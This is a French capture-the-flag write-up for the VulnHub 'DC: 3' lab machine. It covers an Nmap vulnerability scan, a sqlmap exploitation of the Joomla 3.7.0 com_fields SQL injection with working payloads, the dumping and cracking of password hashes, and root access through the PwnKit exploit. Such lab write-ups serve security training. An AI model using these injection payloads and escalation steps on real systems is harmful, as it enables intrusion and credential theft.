---
title: "Solution du CTF DC: 3 de VulnHub"
tags: [VulnHub, CTF]
---

Retrouvez la VM du CTF [sur VulnHub](https://vulnhub.com/entry/dc-32,312/). Il s'agit ici d'un boot2root avec un scénario réaliste.

## PwnLa

Je lance un scan Nmap en activant la recherche de vulnérabilité :

```console
$ sudo nmap -T5 -sCV --script vuln -p- 192.168.56.132
[sudo] Mot de passe de root : 
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 192.168.56.132
Host is up (0.00023s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.56.132:80/media/jui/js/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.56.132:80/media/jui/js/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.56.132:80/media/jui/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|_    http://192.168.56.132:80/media/jui/js/?C=S%3BO%3DA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.132
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.132:80/
|     Form id: login-form
|     Form action: /index.php
|     
|     Path: http://192.168.56.132:80/index.php/2-uncategorised/1-welcome
|     Form id: login-form
|     Form action: /index.php
|     
|     Path: http://192.168.56.132:80/index.php
|     Form id: login-form
|     Form action: /index.php
|     
|     Path: http://192.168.56.132:80/index.php/component/users/?view=remind&amp;Itemid=101
|     Form id: user-registration
|     Form action: /index.php/component/users/?task=remind.remind&Itemid=101
|     
|     Path: http://192.168.56.132:80/index.php/component/users/?view=remind&amp;Itemid=101
|     Form id: login-form
|     Form action: /index.php/component/users/?Itemid=101
|     
|     Path: http://192.168.56.132:80/index.php/component/users/?view=reset&amp;Itemid=101
|     Form id: user-registration
|     Form action: /index.php/component/users/?task=reset.request&Itemid=101
|     
|     Path: http://192.168.56.132:80/index.php/component/users/?view=reset&amp;Itemid=101
|     Form id: login-form
|_    Form action: /index.php/component/users/?Itemid=101
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
|   /language/en-GB/en-GB.xml: Joomla version 3.7.0
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2016-5387   6.8     https://vulners.com/cve/CVE-2016-5387
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355    *EXPLOIT*
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
|       EDB-ID:40909    5.0     https://vulners.com/exploitdb/EDB-ID:40909      *EXPLOIT*
|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740
|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979
|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|       CVE-2023-25690  0.0     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-37436  0.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
| http-vuln-cve2017-8917: 
|   VULNERABLE:
|   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-8917
|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
|       to execute aribitrary SQL commands via unspecified vectors.
|       
|     Disclosure date: 2017-05-17
|     Extra information:
|       User: root@localhost
|     References:
|       https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917
MAC Address: 08:00:27:7C:81:B6 (Oracle VirtualBox virtual NIC)
```

Nmap voit différentes vulnérabilités pour le serveur Apache comme [OptionsBleed](https://vulners.com/seebug/SSV:96537) ainsi que des failles d'escalade de privilèges en local.

Mais surtout il voit un _Joomla!_ vulnérable à la faille _com_fields_.

On trouve une mention [sur exploit-db](https://www.exploit-db.com/exploits/42033) et une ligne de commande d'exemple est donnée pour sqlmap. C'est parti !


```console
$ python sqlmap.py -u "http://192.168.56.132/?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p 'list[fullordering]'
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2.8#dev}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:31:35

[09:31:35] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)' from file 'sqlmap-dev/data/txt/user-agents.txt'
[09:31:36] [INFO] testing connection to the target URL
[09:31:36] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=t777t2fuq1r...dc3g8babs1'). Do you want to use those [Y/n] n
[09:31:38] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:31:39] [INFO] testing if the target URL content is stable
[09:31:39] [INFO] target URL content is stable
[09:31:39] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
[09:31:39] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
[09:31:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:31:46] [WARNING] reflective value(s) found and filtering out
[09:31:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
got a 303 redirect to 'http://192.168.56.132:80/index.php/component/fields/'. Do you want to follow? [Y/n] n
[09:31:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
--- snip ---
[09:33:28] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[09:33:28] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[09:33:28] [INFO] GET parameter 'list[fullordering]' is 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' injectable 
[09:33:28] [INFO] testing 'MySQL inline queries'
[09:33:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
--- snip ---
[09:33:30] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[09:33:40] [INFO] GET parameter 'list[fullordering]' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' injectable 
[09:33:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:33:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:33:40] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
--- snip ---
GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 2716 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(4819,CONCAT(0x2e,0x71766a6a71,(SELECT (ELT(4819=4819,1))),0x717a786a71),5011))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2896 FROM (SELECT(SLEEP(5)))HUso)
---
[09:34:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.1
[09:34:50] [INFO] fetching database names
[09:34:51] [INFO] retrieved: 'information_schema'
[09:34:51] [INFO] retrieved: 'joomladb'
[09:34:51] [INFO] retrieved: 'mysql'
[09:34:51] [INFO] retrieved: 'performance_schema'
[09:34:51] [INFO] retrieved: 'sys'
available databases [5]:
[*] information_schema
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys

[09:34:51] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2675 times
```

Dans cet output (tronqué pour lisibilité) on retiendra surtout que l'exploitation error-based est possible via la fonction `UPDATEXML` de MySQL.
Cela va nous permettre de dumper rapidement la base de données (en comparaison à la technique time-based).

La liste des bases existantes laisse supposer que l'on est suffisamment privilégié (sinon on le verrait que la base courante et `information_schema`).
Je lance donc sqlmap avec `--passwords` pour extraire les hashes MySQL : 

```
[09:37:21] [INFO] fetching database users password hashes
[09:37:22] [INFO] retrieved: 'debian-sys-maint'
[09:37:22] [INFO] retrieved: '*BFD14C8A23EF160EED3D54E16D4F5311264D0963'
[09:37:22] [INFO] retrieved: 'mysql.session'
[09:37:22] [INFO] retrieved: '*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
[09:37:22] [INFO] retrieved: 'mysql.sys'
[09:37:22] [INFO] retrieved: '*0640482736E7906211AEA47971B6C8478BA7DB4D'
[09:37:22] [INFO] retrieved: 'root'
[09:37:22] [INFO] retrieved: '*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE'
```

Le premier se retrouve avec l'aide de _crackstation_ et donne `squires`.

Avec le nom de la base de données du _Joomla!_, je peux alors énumérer les tables présentes (option `--tables`) mais elles ont un préfixe incohérent (exemple: `#__users`).

Je relance sqlmap avec `--hex` et cette fois, c'est mieux : `d8uea_users`.

Avec `-D joomladb -T d8uea_users --dump` j'extrais la liste des utilisateurs. Seul un compte est présent, le compte `admin` (`freddy@norealaddress.net`) dont le hash est `$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`.

Ce dernier tombe rapidement avec JtR :


```console
$ john --wordlist=rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
snoopy           (admin)     
1g 0:00:00:02 DONE (2023-03-21 08:50) 0.4672g/s 67.28p/s 67.28c/s 67.28C/s mylove..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Pour la suite il faut se connecter en admin sur la page `/administrator` puis éditer un fichier PHP (ou en créer un nouveau) comme décrit sur [ma solution du CTF Rosee de Wizard Labs](https://devl00p.github.io/posts/Solution-du-CTF-Rosee-de-Wizard-Labs/).

## JoomKit

Une fois un shell obtenu je remarque un utilisateur `dc3` mais aucun des mots de passe croisés jusqu'ici n'est accepté pour ce compte qui n'a de toute façon pas grand-chose à dévoiler.

`LinPEAS` me remonte que le système est vulnérable à différentes failles kernel mais aussi à PwnKit, c'est donc dans cette direction que je me suis tourné.

[GitHub - ly4k/PwnKit: Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation](https://github.com/ly4k/PwnKit)

J'ai récupéré le binaire `PwnKit32` puis je l'ai exécuté :

```console
www-data@DC-3:/tmp$ ./PwnKit32 
root@DC-3:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@DC-3:/tmp# cd /root
root@DC-3:~# ls 
the-flag.txt
root@DC-3:~# cat the-flag.txt 
 __        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
                                                     

Congratulations are in order.  :-)

I hope you've enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!
```

J'ai aussi essayé l'exploit [Apache 2.4.17 < 2.4.38 - apache2ctl graceful (logrotate) Local Privilege Escalation](https://vulners.com/zdt/1337DAY-ID-32502) mais le système ne s'est pas avéré vulnérable.
